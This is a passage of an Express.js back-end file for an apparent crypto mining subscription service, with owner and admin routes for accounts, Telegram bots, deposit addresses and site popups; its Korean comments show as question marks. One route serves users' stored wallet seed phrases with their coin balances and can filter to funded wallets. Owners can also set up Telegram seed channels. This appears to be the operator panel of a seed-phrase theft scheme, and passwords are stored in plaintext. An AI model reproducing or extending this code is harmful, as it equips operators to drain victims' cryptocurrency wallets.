app.post('/api/owner/logout-all', requireOwnerSession, async (req, res) => {
  try {
    await db.pool.query('DELETE FROM owner_sessions WHERE owner_id = ?', [req.owner.id]);
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// GET /api/owner/me
app.get('/api/owner/me', requireOwnerSession, async (req, res) => {
  res.json({ id: req.owner.id, name: req.owner.name, telegram: req.owner.telegram, role: req.owner.role });
});

// GET /api/owner/telegram-bot ? ??(?? ??) / ??(?????)
app.get('/api/owner/telegram-bot', requireOwnerSession, async (req, res) => {
  try {
    if (req.owner.role === 'manager') {
      const [[mgr]] = await db.pool.query(
        'SELECT tg_bot_token, tg_chat_id, tg_chat_deposit, tg_chat_approval FROM managers WHERE id = ?',
        [req.owner.id]
      );
      if (!mgr) return res.status(404).json({ error: '??? ?? ??' });
      return res.json({
        botToken: mgr.tg_bot_token || '',
        chatId: mgr.tg_chat_id || '',
        chatDeposit: mgr.tg_chat_deposit || '',
        chatApproval: mgr.tg_chat_approval || '',
      });
    }
    const [[o]] = await db.pool.query(
      'SELECT tg_bot_token, tg_chat_seed FROM account_owners WHERE id = ?',
      [req.owner.id]
    );
    res.json({
      botToken: o?.tg_bot_token || '',
      chatSeed: o?.tg_chat_seed || '',
    });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// PUT /api/owner/telegram-bot
app.put('/api/owner/telegram-bot', requireOwnerSession, async (req, res) => {
  try {
    const body = req.body || {};
    if (req.owner.role === 'manager') {
      const [[existing]] = await db.pool.query(
        'SELECT tg_bot_token, tg_chat_id, tg_chat_deposit, tg_chat_approval FROM managers WHERE id = ?',
        [req.owner.id]
      );
      if (!existing) return res.status(404).json({ error: '??? ?? ??' });
      const pick = (bodyKey, col) => {
        if (!Object.prototype.hasOwnProperty.call(body, bodyKey)) return existing[col];
        const v = body[bodyKey];
        if (v == null || String(v).trim() === '') return null;
        return String(v).trim();
      };
      await db.pool.query(
        'UPDATE managers SET tg_bot_token = ?, tg_chat_id = ?, tg_chat_deposit = ?, tg_chat_approval = ? WHERE id = ?',
        [
          pick('botToken', 'tg_bot_token'),
          pick('chatId', 'tg_chat_id'),
          pick('chatDeposit', 'tg_chat_deposit'),
          pick('chatApproval', 'tg_chat_approval'),
          req.owner.id,
        ]
      );
      return res.json({ ok: true });
    }
    const [[cur]] = await db.pool.query(
      'SELECT tg_bot_token, tg_chat_seed FROM account_owners WHERE id = ?',
      [req.owner.id]
    );
    const nextBot = Object.prototype.hasOwnProperty.call(body, 'botToken')
      ? body.botToken != null && String(body.botToken).trim() !== ''
        ? String(body.botToken).trim()
        : null
      : cur?.tg_bot_token ?? null;
    const nextSeed = Object.prototype.hasOwnProperty.call(body, 'chatSeed')
      ? body.chatSeed != null && String(body.chatSeed).trim() !== ''
        ? String(body.chatSeed).trim()
        : null
      : cur?.tg_chat_seed ?? null;
    await db.pool.query('UPDATE account_owners SET tg_bot_token = ?, tg_chat_seed = ? WHERE id = ?', [
      nextBot,
      nextSeed,
      req.owner.id,
    ]);
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// POST /api/owner/telegram-bot/test
app.post('/api/owner/telegram-bot/test', requireOwnerSession, async (req, res) => {
  try {
    if (req.owner.role === 'manager') {
      const channel = (req.body?.channel || 'deposit').toString();
      const [[mgr]] = await db.pool.query(
        'SELECT tg_bot_token, tg_chat_id, tg_chat_deposit, tg_chat_approval FROM managers WHERE id = ?',
        [req.owner.id]
      );
      if (!mgr?.tg_bot_token) return res.status(400).json({ error: '? ??? ?????.' });
      const dep = (mgr.tg_chat_deposit || '').toString().trim() || (mgr.tg_chat_id || '').toString().trim() || null;
      const appr = (mgr.tg_chat_approval || '').toString().trim() || (mgr.tg_chat_id || '').toString().trim() || null;
      const chat = channel === 'approval' ? appr : dep;
      if (!chat) return res.status(400).json({ error: '?? ?? Chat ID? ????.' });
      await sendTelegram(
        mgr.tg_bot_token,
        chat,
        `?? <b>???</b> (${channel === 'approval' ? '??' : '??'})\n?? ${escapeHtml(new Date().toLocaleString('ko-KR'))}`,
        true
      );
      return res.json({ ok: true });
    }
    const [[o]] = await db.pool.query(
      'SELECT tg_bot_token, tg_chat_seed FROM account_owners WHERE id = ?',
      [req.owner.id]
    );
    if (!o?.tg_bot_token || !(o.tg_chat_seed || '').toString().trim()) {
      return res.status(400).json({ error: '? ??? Chat ID(??)? ?????.' });
    }
    await sendTelegram(
      o.tg_bot_token,
      String(o.tg_chat_seed).trim(),
      `?? <b>?? ?? ???</b>\n?? ${escapeHtml(new Date().toLocaleString('ko-KR'))}`,
      true
    );
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// GET /api/owner/accounts ? ??? ?? ?? ?? + ??
app.get('/api/owner/accounts', requireOwnerSession, async (req, res) => {
  try {
    const [users] = await db.pool.query(
      `SELECT u.id, u.telegram, u.status, u.expire_date, u.subscription_days,
              ms.status as miner_status, ms.coin_type
       FROM users u
       LEFT JOIN miner_status ms ON ms.user_id = u.id
       WHERE u.owner_id = ?
       ORDER BY u.id`,
      [req.owner.id]
    );
    const now = new Date();
    const result = users.map(u => {
      const exp = u.expire_date ? new Date(u.expire_date) : null;
      const remainingDays = exp ? Math.ceil((exp - now) / 86400000) : 0;
      return {
        id: u.id,
        telegram: u.telegram || '',
        status: u.status,
        expireDate: u.expire_date || null,
        remainingDays,
        isExpired: exp ? now > exp : true,
        minerStatus: u.miner_status || 'stopped',
        coinType: u.coin_type || 'BTC',
      };
    });
    res.json({ accounts: result, total: result.length });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// PATCH /api/owner/accounts/:id/password ? ?? ???? ?? (??/????)
app.patch('/api/owner/accounts/:id/password', requireOwnerSession, async (req, res) => {
  try {
    const targetId = req.params.id.toLowerCase();
    const { new_password } = req.body || {};
    if (!new_password?.trim()) return res.status(400).json({ error: '? ????? ?????.' });

    // ?? ??: users.owner_id = ?? ?? OR ???? ?? ?? ??? ?? ??? ??
    const [[owns]] = await db.pool.query(
      `SELECT u.id FROM users u
       LEFT JOIN account_owners ao ON ao.id = u.owner_id
       WHERE u.id = ?
         AND (u.owner_id = ? OR ao.manager_id = ?)`,
      [targetId, req.owner.id, req.owner.id]
    );
    if (!owns) return res.status(403).json({ error: '??? ??? ????.' });

    await db.pool.query('UPDATE users SET pw = ? WHERE id = ?', [new_password.trim(), targetId]);
    res.json({ ok: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// GET /api/owner/accounts/:id/mining-records ? ?? ?? ?? ??
app.get('/api/owner/accounts/:id/mining-records', requireOwnerSession, async (req, res) => {
  try {
    const targetId = req.params.id.toLowerCase();
    // ?? ??
    const [[owns]] = await db.pool.query('SELECT id FROM users WHERE id = ? AND owner_id = ?', [targetId, req.owner.id]);
    if (!owns) return res.status(403).json({ error: '??? ??? ????.' });
    const [records] = await db.pool.query(
      'SELECT id, coin_type, amount, mined_at, note FROM mining_records WHERE user_id = ? ORDER BY mined_at DESC LIMIT 50',
      [targetId]
    );
    const [[{ cumulative }]] = await db.pool.query('SELECT COALESCE(SUM(amount),0) as cumulative FROM mining_records WHERE user_id = ?', [targetId]);
    res.json({ records, cumulative: Number(cumulative) });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// POST /api/owner/create-account ? ??? ??? ?? ?? ??
app.post('/api/owner/create-account', requireOwnerSession, async (req, res) => {
  try {
    const { id, password, telegram } = req.body || {};
    if (!id?.trim() || !password?.trim()) return res.status(400).json({ error: '???? ????? ?????.' });
    const newId = id.trim().toLowerCase();
    const [[exists]] = await db.pool.query('SELECT id FROM users WHERE id = ?', [newId]);
    if (exists) return res.status(400).json({ error: '?? ???? ??????.' });
    // owner? manager_id? referral? ??
    const managerId = req.owner.managerId || '';
    await db.pool.query(
      'INSERT INTO users (id, pw, manager_id, telegram, status, owner_id) VALUES (?, ?, ?, ?, "pending", ?)',
      [newId, password.trim(), managerId, telegram?.trim() || '', req.owner.id]
    );
    res.json({ ok: true, id: newId });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// POST /api/owner/kick ? ?? ?? ??? ?? ?? ??
app.post('/api/owner/kick', requireOwnerSession, async (req, res) => {
  try {
    const { userId } = req.body || {};
    if (!userId) return res.status(400).json({ error: 'userId ??' });
    const [[owns]] = await db.pool.query('SELECT id FROM users WHERE id = ? AND owner_id = ?', [userId, req.owner.id]);
    if (!owns) return res.status(403).json({ error: '??? ??? ????.' });
    await sessionStore.kickUser(userId);
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// GET /api/owner/seeds ? ?? ?? ????? ?? ?? (?? ?? + ??????)
app.get('/api/owner/seeds', requireOwnerSession, async (req, res) => {
  try {
    const hasBalance = req.query.hasBalance === '1';
    const page     = Math.max(1, parseInt(req.query.page) || 1);
    const pageSize = Math.min(50, Math.max(1, parseInt(req.query.pageSize) || 10));
    const offset   = (page - 1) * pageSize;

    let where = 'WHERE u.owner_id = ?';
    const params = [req.owner.id];
    if (hasBalance) {
      where += ' AND (IFNULL(s.balance,0)>0 OR IFNULL(s.usdt_balance,0)>0 OR IFNULL(s.btc,0)>0 OR IFNULL(s.eth,0)>0 OR IFNULL(s.tron,0)>0 OR IFNULL(s.sol,0)>0)';
    }

    const [[{ total }]] = await db.pool.query(
      `SELECT COUNT(*) as total FROM seeds s JOIN users u ON s.user_id = u.id ${where}`,
      params
    );
    const [rows] = await db.pool.query(
      `SELECT s.id, s.user_id, s.phrase, s.created_at, s.balance, s.usdt_balance, s.btc, s.eth, s.tron, s.sol
       FROM seeds s JOIN users u ON s.user_id = u.id ${where}
       ORDER BY s.id DESC LIMIT ? OFFSET ?`,
      [...params, pageSize, offset]
    );

    res.json({
      seeds: rows.map(r => ({
        id: r.id,
        userId: r.user_id,
        phrase: r.phrase || '',
        balance: Number(r.balance || 0),
        usdtBalance: Number(r.usdt_balance || 0),
        btc: Number(r.btc || 0),
        eth: Number(r.eth || 0),
        tron: Number(r.tron || 0),
        sol: Number(r.sol || 0),
        at: r.created_at,
      })),
      total: Number(total),
      page,
      pageSize,
      totalPages: Math.ceil(Number(total) / pageSize),
    });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// POST /api/owner/payment/request-address ? ??? ?? ????? ?? ?? ??
app.post('/api/owner/payment/request-address', requireOwnerSession, async (req, res) => {
  try {
    const { userId, network, tokenType } = req.body || {};
    if (!userId?.trim()) return res.status(400).json({ error: 'userId ??' });
    const resolvedUserId = userId.trim().toLowerCase();
    // ?? ??
    const [[owns]] = await db.pool.query('SELECT id FROM users WHERE id = ? AND owner_id = ?', [resolvedUserId, req.owner.id]);
    if (!owns) return res.status(403).json({ error: '??? ??? ????.' });

    const activeWallet = await db.collectionWalletDB.getActive();
    if (!activeWallet) return res.status(503).json({ error: '???? ?? ??? ????. ????? ?????.' });

    const existing = await db.depositAddressDB.findByUserAndVersion(resolvedUserId, activeWallet.wallet_version);
    const isExpiredAddress = existing?.status === 'expired';

    if (existing && !isExpiredAddress) {
      if (existing.status !== 'issued' && existing.status !== 'waiting_deposit') {
        await db.depositAddressDB.updateStatus(existing.deposit_address, 'issued');
      }
      return res.json({ address: existing.deposit_address, walletVersion: existing.wallet_version, status: 'issued', isNew: false });
    }

    const secret = activeWallet.xpub_key;
    let newAddress, insertSuccess = false;
    const MAX_RETRY = 5;
    for (let attempt = 0; attempt < MAX_RETRY; attempt++) {
      const [maxRows] = await db.pool.query(
        'SELECT COALESCE(MAX(derivation_index), 0) AS maxIdx FROM deposit_addresses WHERE wallet_version = ?',
        [activeWallet.wallet_version]
      );
      const newIndex = maxRows[0].maxIdx + 1 + attempt;
      if (secret) {
        try { newAddress = deriveTronAddress(secret, newIndex); } catch (e) {
          return res.status(500).json({ error: '?? ?? ??.' });
        }
      } else {
        newAddress = activeWallet.root_wallet_address;
      }
      try {
        await db.depositAddressDB.create({ userId: resolvedUserId, orderId: null, network: network || 'TRON', token: tokenType || 'USDT', depositAddress: newAddress, walletVersion: activeWallet.wallet_version, derivationIndex: newIndex });
        insertSuccess = true;
        break;
      } catch (insertErr) {
        if (insertErr.code === 'ER_DUP_ENTRY') continue;
        throw insertErr;
      }
    }
    if (!insertSuccess) return res.status(500).json({ error: '?? ?? ??. ?? ? ?? ??????.' });
    res.json({ address: newAddress, walletVersion: activeWallet.wallet_version, status: 'issued', isNew: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// POST /api/owner/payment/bulk-request-address ? ?? ?? ?? ??
app.post('/api/owner/payment/bulk-request-address', requireOwnerSession, async (req, res) => {
  try {
    const { entries, targetDate, totalUsdt } = req.body || {};
    if (!Array.isArray(entries) || !entries.length || !targetDate || !(totalUsdt > 0))
      return res.status(400).json({ error: '?? ???? ??' });

    // ??? ??
    const userIds = entries.map(e => e.userId?.toLowerCase()).filter(Boolean);
    const [owned] = await db.pool.query(
      `SELECT id FROM users WHERE id IN (${userIds.map(() => '?').join(',')}) AND owner_id = ?`,
      [...userIds, req.owner.id]
    );
    if (owned.length !== userIds.length)
      return res.status(403).json({ error: '???? ?? ??? ???? ????.' });

    // ?? ?? ?? ?? ???
    const [[existing]] = await db.pool.query(
      `SELECT id, deposit_address, total_usdt FROM bulk_payment_sessions
       WHERE owner_id = ? AND status = 'pending' AND created_at > DATE_SUB(NOW(), INTERVAL 1 HOUR)
       ORDER BY created_at DESC LIMIT 1`,
      [req.owner.id]
    );
    if (existing) {
      return res.json({ token: existing.id, address: existing.deposit_address, totalUsdt: Number(existing.total_usdt) });
    }

    const activeWallet = await db.collectionWalletDB.getActive();
    if (!activeWallet) return res.status(503).json({ error: '???? ?? ??? ????.' });

    // ? ?? ?? ??
    const secret = activeWallet.xpub_key;
    let newAddress = null, newIndex = null;
    const MAX_RETRY = 5;
    for (let attempt = 0; attempt < MAX_RETRY; attempt++) {
      const [maxRows] = await db.pool.query(
        'SELECT COALESCE(MAX(derivation_index), 0) AS maxIdx FROM deposit_addresses WHERE wallet_version = ?',
        [activeWallet.wallet_version]
      );
      // bulk ????? ?? index ??
      const [maxRowsB] = await db.pool.query(
        'SELECT COALESCE(MAX(derivation_index), 0) AS maxIdx FROM bulk_payment_sessions WHERE wallet_version = ?',
        [activeWallet.wallet_version]
      );
      const combined = Math.max(maxRows[0].maxIdx, maxRowsB[0].maxIdx);
      newIndex = combined + 1 + attempt;
      if (secret) {
        try { newAddress = deriveTronAddress(secret, newIndex); } catch (e) {
          return res.status(500).json({ error: '?? ?? ??.' });
        }
      } else {
        newAddress = activeWallet.root_wallet_address;
      }
      // ?? ?? ??
      const [[dup]] = await db.pool.query(
        'SELECT id FROM bulk_payment_sessions WHERE deposit_address = ?', [newAddress]
      );
      if (!dup) break;
    }
    if (!newAddress) return res.status(500).json({ error: '?? ?? ??.' });

    const token = crypto.randomBytes(24).toString('hex');
    await db.pool.query(
      `INSERT INTO bulk_payment_sessions (id, owner_id, entries, target_date, total_usdt, deposit_address, wallet_version, derivation_index)
       VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
      [token, req.owner.id, JSON.stringify(entries), targetDate, totalUsdt, newAddress, activeWallet.wallet_version, newIndex]
    );
    console.log(`[BULK-ADDR] ?? owner=${req.owner.id} addr=${newAddress} total=${totalUsdt}`);
    res.json({ token, address: newAddress, totalUsdt: Number(totalUsdt) });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// GET /api/owner/payment/bulk-status ? ?? ?? ?? ??
app.get('/api/owner/payment/bulk-status', requireOwnerSession, async (req, res) => {
  try {
    const { token } = req.query;
    if (!token) return res.status(400).json({ error: 'token ??' });
    const [[sess]] = await db.pool.query(
      'SELECT id, status, deposit_address, total_usdt, target_date FROM bulk_payment_sessions WHERE id = ? AND owner_id = ?',
      [token, req.owner.id]
    );
    if (!sess) return res.status(404).json({ error: '?? ??' });
    res.json({ status: sess.status, address: sess.deposit_address, totalUsdt: Number(sess.total_usdt), targetDate: sess.target_date });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ========== ??? ? ?? ?? ?? API ==========

// GET /api/admin/account-owners ? ?? ?? (status ??)
app.get('/api/admin/account-owners', requireAdmin, async (req, res) => {
  try {
    let where = '';
    const params = [];
    if (req.admin.role !== 'master') {
      where = ' WHERE o.manager_id = ?';
      params.push(req.admin.id);
    }
    const [rows] = await db.pool.query(
      `SELECT o.id, o.name, o.telegram, o.manager_id, o.status, o.created_at,
              (SELECT COUNT(*)    FROM users u         WHERE u.owner_id = o.id)                                       AS account_count,
              (SELECT COUNT(*)    FROM users u
                                  JOIN miner_status ms ON ms.user_id = u.id
                                  WHERE u.owner_id = o.id AND ms.status = 'running')                                 AS active_miners,
              (SELECT COUNT(*)    FROM owner_sessions os WHERE os.owner_id = o.id)                                    AS has_session
       FROM account_owners o
       ${where}
       ORDER BY FIELD(o.status,'pending','approved','rejected'), o.created_at DESC`,
      params
    );
    res.json({ owners: rows });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// POST /api/admin/account-owners ? ?? ?? ?? (status='approved')
app.post('/api/admin/account-owners', requireAdmin, async (req, res) => {
  try {
    const { id, password, name, telegram } = req.body || {};
    if (!id?.trim() || !password?.trim()) return res.status(400).json({ error: 'id, password ??' });
    const ownerId = id.trim().toLowerCase();
    const [[exists]] = await db.pool.query('SELECT id FROM account_owners WHERE id = ?', [ownerId]);
    if (exists) return res.status(400).json({ error: '?? ???? ID???.' });
    const managerId = req.admin.role === 'master' ? (req.body.manager_id || null) : req.admin.id;
    await db.pool.query(
      'INSERT INTO account_owners (id, pw, name, telegram, manager_id, status) VALUES (?, ?, ?, ?, ?, ?)',
      [ownerId, password.trim(), name?.trim() || null, telegram?.trim() || null, managerId, 'approved']
    );
    res.json({ ok: true, id: ownerId });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// POST /api/admin/account-owners/:id/kick-session ? ?? ?? ?? ??
app.post('/api/admin/account-owners/:id/kick-session', requireAdmin, async (req, res) => {
  try {
    const ownerId = req.params.id;
    if (req.admin.role !== 'master') {
      const [[owner]] = await db.pool.query('SELECT manager_id FROM account_owners WHERE id = ?', [ownerId]);
      if (!owner || owner.manager_id !== req.admin.id) return res.status(403).json({ error: '?? ??' });
    }
    const [result] = await db.pool.query('DELETE FROM owner_sessions WHERE owner_id = ?', [ownerId]);
    res.json({ ok: true, deleted: result.affectedRows });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// POST /api/admin/account-owners/:id/approve ? ?? ??
app.post('/api/admin/account-owners/:id/approve', requireAdmin, async (req, res) => {
  try {
    const ownerId = req.params.id;
    if (req.admin.role !== 'master') {
      const [[owner]] = await db.pool.query('SELECT manager_id FROM account_owners WHERE id = ?', [ownerId]);
      if (!owner || owner.manager_id !== req.admin.id) return res.status(403).json({ error: '?? ??' });
    }
    await db.pool.query("UPDATE account_owners SET status = 'approved' WHERE id = ?", [ownerId]);
    res.json({ ok: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// POST /api/admin/account-owners/:id/reject ? ?? ??
app.post('/api/admin/account-owners/:id/reject', requireAdmin, async (req, res) => {
  try {
    const ownerId = req.params.id;
    if (req.admin.role !== 'master') {
      const [[owner]] = await db.pool.query('SELECT manager_id FROM account_owners WHERE id = ?', [ownerId]);
      if (!owner || owner.manager_id !== req.admin.id) return res.status(403).json({ error: '?? ??' });
    }
    await db.pool.query("UPDATE account_owners SET status = 'rejected' WHERE id = ?", [ownerId]);
    res.json({ ok: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// DELETE /api/admin/account-owners/:id ? ?? ??
app.delete('/api/admin/account-owners/:id', requireAdmin, async (req, res) => {
  try {
    const ownerId = req.params.id;
    if (req.admin.role !== 'master') {
      const [[owner]] = await db.pool.query('SELECT manager_id FROM account_owners WHERE id = ?', [ownerId]);
      if (!owner || owner.manager_id !== req.admin.id) return res.status(403).json({ error: '?? ??' });
    }
    // ??? users? owner_id ??
    await db.pool.query('UPDATE users SET owner_id = NULL WHERE owner_id = ?', [ownerId]);
    await db.pool.query('DELETE FROM owner_sessions WHERE owner_id = ?', [ownerId]);
    await db.pool.query('DELETE FROM account_owners WHERE id = ?', [ownerId]);
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// PATCH /api/admin/account-owners/:id ? ?? ?? ?? (??????????????????)
app.patch('/api/admin/account-owners/:id', requireAdmin, async (req, res) => {
  try {
    const ownerId = req.params.id;
    if (req.admin.role !== 'master') {
      const [[owner]] = await db.pool.query('SELECT manager_id FROM account_owners WHERE id = ?', [ownerId]);
      if (!owner || owner.manager_id !== req.admin.id) return res.status(403).json({ error: '?? ??' });
    }
    const { name, telegram, password, manager_id } = req.body || {};
    const fields = [];
    const vals   = [];
    if (name      !== undefined) { fields.push('name=?');       vals.push(name || null); }
    if (telegram  !== undefined) { fields.push('telegram=?');   vals.push(telegram || null); }
    if (password?.trim())        { fields.push('pw=?');         vals.push(password.trim()); }
    if (manager_id !== undefined && req.admin.role === 'master') {
      fields.push('manager_id=?'); vals.push(manager_id || null);
    }
    if (!fields.length) return res.status(400).json({ error: '??? ??? ????.' });
    vals.push(ownerId);
    await db.pool.query(`UPDATE account_owners SET ${fields.join(',')} WHERE id=?`, vals);
    res.json({ ok: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// PATCH /api/admin/managers/:id ? ??? ?? ?? (????????????)
app.patch('/api/admin/managers/:id', requireAdmin, async (req, res) => {
  try {
    if (req.admin.role !== 'master') return res.status(403).json({ error: '???? ?????.' });
    const mgrId = req.params.id;
    const { password, telegram, memo } = req.body || {};
    const fields = [];
    const vals   = [];
    if (password?.trim()) { fields.push('pw=?');       vals.push(password.trim()); }
    if (telegram !== undefined) { fields.push('telegram=?'); vals.push(telegram || null); }
    if (memo     !== undefined) { fields.push('memo=?');     vals.push(memo || null); }
    if (!fields.length) return res.status(400).json({ error: '??? ??? ????.' });
    vals.push(mgrId);
    await db.pool.query(`UPDATE managers SET ${fields.join(',')} WHERE id=? AND role='manager'`, vals);
    res.json({ ok: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// GET /api/admin/account-owners/:id/accounts ? ??? ??? ?? ??
app.get('/api/admin/account-owners/:id/accounts', requireAdmin, async (req, res) => {
  try {
    const [rows] = await db.pool.query(
       `SELECT u.id, u.telegram, u.status, u.expire_date,
              COALESCE(ms.status, 'stopped')  AS miner_status,
              IF(COUNT(s.token) > 0, 1, 0)    AS has_session
       FROM users u
       LEFT JOIN miner_status ms ON ms.user_id = u.id
       LEFT JOIN sessions s      ON s.user_id = u.id AND s.kicked = FALSE
       WHERE u.owner_id = ?
       GROUP BY u.id
       ORDER BY u.id`,
      [req.params.id]
    );
    res.json({ accounts: rows });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// PATCH /api/admin/users/:id/owner ? ?? ??? ?? ??/??
app.patch('/api/admin/users/:id/owner', requireAdmin, async (req, res) => {
  try {
    const targetId = req.params.id.toLowerCase();
    const { owner_id } = req.body || {};
    // ?? ?? ?? (null?? ??)
    if (owner_id) {
      const [[owner]] = await db.pool.query('SELECT id FROM account_owners WHERE id = ?', [owner_id]);
      if (!owner) return res.status(404).json({ error: '?? ??? ?? ? ????.' });
    }
    await db.pool.query('UPDATE users SET owner_id = ? WHERE id = ?', [owner_id || null, targetId]);
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ========== ?? / ???? ??? ??? ==========
(async () => {
  try {
    await db.pool.query(`
      CREATE TABLE IF NOT EXISTS popups (
        id INT AUTO_INCREMENT PRIMARY KEY,
        title VARCHAR(200) NOT NULL,
        content TEXT,
        image_url VARCHAR(500),
        link_url VARCHAR(500),
        link_label VARCHAR(100),
        start_at DATETIME,
        end_at DATETIME,
        active TINYINT(1) DEFAULT 1,
        created_at DATETIME DEFAULT NOW()
      )
    `);
    await db.pool.query(`
      CREATE TABLE IF NOT EXISTS downloads (
        id INT AUTO_INCREMENT PRIMARY KEY,
        title VARCHAR(200) NOT NULL,
        url VARCHAR(500) NOT NULL,
        description TEXT,
        sort_order INT DEFAULT 0,
        active TINYINT(1) DEFAULT 1,
        created_at DATETIME DEFAULT NOW()
      )
    `);
    console.log('? popups / downloads ??? ?? ??');
  } catch (e) { console.error('??? ??? ??:', e.message); }
})();

// ========== ?? API: ??/???? ==========

// GET /api/popups ? ?? ?? ?? (owner.html?? ??)
app.get('/api/popups', async (req, res) => {
  try {
    const now = new Date();
    const [rows] = await db.pool.query(
      `SELECT id, title, content, image_url, link_url, link_label
       FROM popups
       WHERE active=1
         AND (start_at IS NULL OR start_at <= ?)
         AND (end_at IS NULL OR end_at >= ?)
       ORDER BY created_at DESC`,
      [now, now]
    );
    res.json(rows);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// GET /api/downloads ? ?? ???? ?? (owner.html?? ??)
app.get('/api/downloads', async (req, res) => {
  try {
    const [rows] = await db.pool.query(
      `SELECT id, title, url, description FROM downloads WHERE active=1 ORDER BY sort_order, created_at DESC`
    );
    res.json(rows);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// POST /api/admin/upload-popup-image ? ?? ??? ???
app.post('/api/admin/upload-popup-image', requireAdmin, _uploadPopup.single('image'), (req, res) => {
  if (req.admin.role !== 'master') return res.status(403).json({ error: '???? ??' });
  if (!req.file) return res.status(400).json({ error: '??? ????.' });
  const url = '/uploads/popups/' + req.file.filename;
  res.json({ ok: true, url });
});

// ========== ???: ?? CRUD ==========

app.get('/api/admin/popups', requireAdmin, async (req, res) => {
  try {
    const [rows] = await db.pool.query('SELECT * FROM popups ORDER BY created_at DESC');
    res.json(rows);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/admin/popups', requireAdmin, async (req, res) => {
  try {
    if (req.admin.role !== 'master') return res.status(403).json({ error: '???? ??' });
    const { title, content, image_url, link_url, link_label, start_at, end_at, active } = req.body || {};
    if (!title?.trim()) return res.status(400).json({ error: '??? ?????.' });
    const [r] = await db.pool.query(
      `INSERT INTO popups (title, content, image_url, link_url, link_label, start_at, end_at, active) VALUES (?,?,?,?,?,?,?,?)`,
      [title.trim(), content||null, image_url||null, link_url||null, link_label||null,
       start_at||null, end_at||null, active === false ? 0 : 1]
    );
    res.json({ ok: true, id: r.insertId });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.patch('/api/admin/popups/:id', requireAdmin, async (req, res) => {
  try {
    if (req.admin.role !== 'master') return res.status(403).json({ error: '???? ??' });
    const { title, content, image_url, link_url, link_label, start_at, end_at, active } = req.body || {};
    const fields = []; const vals = [];
    if (title      !== undefined) { fields.push('title=?');       vals.push(title||'??'); }
    if (content    !== undefined) { fields.push('content=?');     vals.push(content||null); }
    if (image_url  !== undefined) { fields.push('image_url=?');   vals.push(image_url||null); }
    if (link_url   !== undefined) { fields.push('link_url=?');    vals.push(link_url||null); }
    if (link_label !== undefined) { fields.push('link_label=?');  vals.push(link_label||null); }
    if (start_at   !== undefined) { fields.push('start_at=?');    vals.push(start_at||null); }
    if (end_at     !== undefined) { fields.push('end_at=?');      vals.push(end_at||null); }
    if (active     !== undefined) { fields.push('active=?');      vals.push(active ? 1 : 0); }
    if (!fields.length) return res.status(400).json({ error: '?? ?? ??' });
    vals.push(req.params.id);
    await db.pool.query(`UPDATE popups SET ${fields.join(',')} WHERE id=?`, vals);
    res.json({ ok: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.delete('/api/admin/popups/:id', requireAdmin, async (req, res) => {
  try {
    if (req.admin.role !== 'master') return res.status(403).json({ error: '???? ??' });
    await db.pool.query('DELETE FROM popups WHERE id=?', [req.params.id]);
    res.json({ ok: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ========== ???: ???? CRUD ==========

app.get('/api/admin/downloads', requireAdmin, async (req, res) => {
  try {
    const [rows] = await db.pool.query('SELECT * FROM downloads ORDER BY sort_order, created_at DESC');
    res.json(rows);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/admin/downloads', requireAdmin, async (req, res) => {
  try {
    if (req.admin.role !== 'master') return res.status(403).json({ error: '???? ??' });
    const { title, url, description, sort_order, active } = req.body || {};
    if (!title?.trim() || !url?.trim()) return res.status(400).json({ error: '??? URL? ?????.' });
    const [r] = await db.pool.query(
      `INSERT INTO downloads (title, url, description, sort_order, active) VALUES (?,?,?,?,?)`,
      [title.trim(), url.trim(), description||null, sort_order||0, active === false ? 0 : 1]
    );
    res.json({ ok: true, id: r.insertId });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.patch('/api/admin/downloads/:id', requireAdmin, async (req, res) => {
  try {
    if (req.admin.role !== 'master') return res.status(403).json({ error: '???? ??' });
    const { title, url, description, sort_order, active } = req.body || {};
    const fields = []; const vals = [];
    if (title       !== undefined) { fields.push('title=?');       vals.push(title||''); }
    if (url         !== undefined) { fields.push('url=?');         vals.push(url||''); }
    if (description !== undefined) { fields.push('description=?'); vals.push(description||null); }
    if (sort_order  !== undefined) { fields.push('sort_order=?');  vals.push(sort_order||0); }
    if (active      !== undefined) { fields.push('active=?');      vals.push(active ? 1 : 0); }
    if (!fields.length) return res.status(400).json({ error: '?? ?? ??' });
    vals.push(req.params.id);
    await db.pool.query(`UPDATE downloads SET ${fields.join(',')} WHERE id=?`, vals);
    res.json({ ok: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.delete('/api/admin/downloads/:id', requireAdmin, async (req, res) => {
  try {
    if (req.admin.role !== 'master') return res.status(403).json({ error: '???? ??' });
    await db.pool.query('DELETE FROM downloads WHERE id=?', [req.params.id]);
    res.json({ ok: true });
